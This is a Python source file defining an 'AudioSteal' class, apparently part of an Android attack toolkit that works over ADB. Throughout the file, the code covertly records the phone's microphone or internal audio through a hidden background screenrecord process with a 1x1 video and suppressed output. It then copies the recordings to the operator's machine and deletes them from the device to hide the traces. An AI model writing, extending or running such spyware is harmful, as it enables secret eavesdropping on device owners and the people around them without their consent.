import time
from typing import Optional, Dict, Any

from core.adb_handler import ADBHandler
from core.utils import Utils


class AudioSteal:
    def __init__(self, config: dict):
        self.config = config
        self.adb = ADBHandler(config)
        self.output_dir = Utils.ensure_dir("outputs/audio")

    def start_microphone_recording(self, duration_seconds: int = 30, device_serial: Optional[str] = None) -> bool:
        remote_path = "/sdcard/mic_record.aac"
        cmd = f"nohup screenrecord --time-limit {duration_seconds} --audio-source=mic --video-size=1x1 {remote_path} > /dev/null 2>&1 &"
        stdout, stderr, code = self.adb.shell(cmd, device_serial)
        return code == 0

    def stop_microphone_recording(self, device_serial: Optional[str] = None) -> bool:
        stdout, stderr, code = self.adb.shell("pkill -f screenrecord", device_serial)
        return code == 0

    def pull_microphone_recording(self, device_serial: Optional[str] = None) -> Optional[str]:
        remote_path = "/sdcard/mic_record.aac"
        local_path = str(self.output_dir / f"mic_record_{Utils.timestamp()}.aac")
        if self.adb.pull(remote_path, local_path, device_serial):
            self.adb.shell(f"rm -f {remote_path}", device_serial)
            return local_path
        return None

    def start_internal_audio_recording(self, duration_seconds: int = 30, device_serial: Optional[str] = None) -> bool:
        remote_path = "/sdcard/internal_audio.aac"
        cmd = f"nohup screenrecord --time-limit {duration_seconds} --audio-source=internal --video-size=1x1 {remote_path} > /dev/null 2>&1 &"
        stdout, stderr, code = self.adb.shell(cmd, device_serial)
        return code == 0

    def stop_internal_audio_recording(self, device_serial: Optional[str] = None) -> bool:
        stdout, stderr, code = self.adb.shell("pkill -f screenrecord", device_serial)
        return code == 0

    def pull_internal_audio_recording(self, device_serial: Optional[str] = None) -> Optional[str]:
        remote_path = "/sdcard/internal_audio.aac"
        local_path = str(self.output_dir / f"internal_audio_{Utils.timestamp()}.aac")
        if self.adb.pull(remote_path, local_path, device_serial):
            self.adb.shell(f"rm -f {remote_path}", device_serial)
            return local_path
        return None

    def get_audio_devices(self, device_serial: Optional[str] = None) -> str:
        stdout, stderr, code = self.adb.shell("dumpsys media_audio_policy", device_serial)
        return stdout if code == 0 else ""